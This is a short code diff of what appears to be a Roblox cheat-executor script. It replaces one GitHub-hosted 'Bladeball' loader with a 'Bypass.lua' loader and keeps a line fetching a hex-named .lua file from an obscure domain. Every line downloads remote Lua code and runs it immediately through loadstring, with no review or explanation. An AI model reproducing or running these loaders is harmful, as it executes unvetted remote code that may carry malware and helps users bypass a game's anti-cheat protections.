@@ -1,3 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/fadeUploads/Bladeball/refs/heads/main/Fade"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Fsploit/Frostware-/refs/heads/main/Bypass.lua"))()
 
 loadstring(game:HttpGet("https://egorikusa.space/63c4b62629dc045b2872be31.lua", true))()
